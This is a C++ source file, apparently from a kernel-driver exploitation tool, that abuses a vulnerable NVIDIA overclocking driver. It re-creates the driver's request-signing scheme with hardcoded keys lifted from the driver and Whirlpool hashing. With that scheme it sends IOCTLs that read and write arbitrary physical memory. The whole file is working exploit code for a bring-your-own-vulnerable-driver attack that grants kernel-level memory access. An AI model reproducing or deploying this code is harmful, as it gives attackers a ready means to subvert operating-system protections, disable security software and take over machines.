/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       NVIDIA.CPP
*
*  VERSION:     1.34
*
*  DATE:        16 Sep 2023
*
*  NVidia drivers routines.
* 
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/nvidia.h"

#ifdef __cplusplus
extern "C" {
#include "../Shared/thirdparty/whirlpool/whirlpool.h"
}
#endif

//
// Nvo based on https://github.com/zer0condition/NVDrv
//

VOID whirlpool(
    _In_ PVOID pcData,
    _In_ ULONG cbData, 
    _Inout_ PVOID result)
{
    NESSIEstruct structpointer;

    NESSIEinit(&structpointer);
    NESSIEadd((const PUCHAR)pcData, 8 * cbData, &structpointer);
    NESSIEfinalize(&structpointer, (PUCHAR)result);
}

/*
* NvoEncryptRequest
*
* Purpose:
*
* Encrypts request for driver side verification.
* Exact code ripped from driver.
*
*/
VOID NvoEncryptRequest(
    _In_ PVOID Request,
    _In_ ULONG Size,
    _In_ PVOID EncryptedKey
)
{
    char key_value2[64]; 
    char key_value1[64]; 
    char result1[256];
    char result2[312];

    _strcpy_a(key_value1, "Dfasd0981=kFGdv'df,b;lsk"); //random bullshit go
    memset(&key_value1[25], 0, 39);
    _strcpy_a(key_value2, "kasjhf923uasdfkYYE-=~");
    memset(&key_value2[22], 0, 42);
    memset(result1, 0, sizeof(result1));
    memset(result2, 0, 256);
    whirlpool(Request, Size, &result1);
    RtlCopyMemory(&result1[64], key_value1, 64ui64);
    whirlpool(&result1, 128, &result2);
    RtlCopyMemory(&result2[64], key_value2, 64ui64);
    whirlpool(&result2, 128, EncryptedKey);
}

/*
* NvoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI NvoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    NVOCLOCK_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.FunctionId = NV_FUNCID_PHYS_READ;
    request.Size = NumberOfBytes;
    request.Destination = Buffer;
    request.Source = (PVOID)PhysicalAddress;
    
    NvoEncryptRequest(&request, 0x38, &request.EncryptKey);

    return supCallDriver(DeviceHandle,
        IOCTL_NVOCLOCK_DISPATCH,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* NvoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI NvoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    NVOCLOCK_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.FunctionId = NV_FUNCID_PHYS_WRITE;
    request.Size = NumberOfBytes;
    request.Destination = (PVOID)PhysicalAddress;
    request.Source = Buffer;

    NvoEncryptRequest(&request, 0x38, &request.EncryptKey);

    return supCallDriver(DeviceHandle,
        IOCTL_NVOCLOCK_DISPATCH,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}
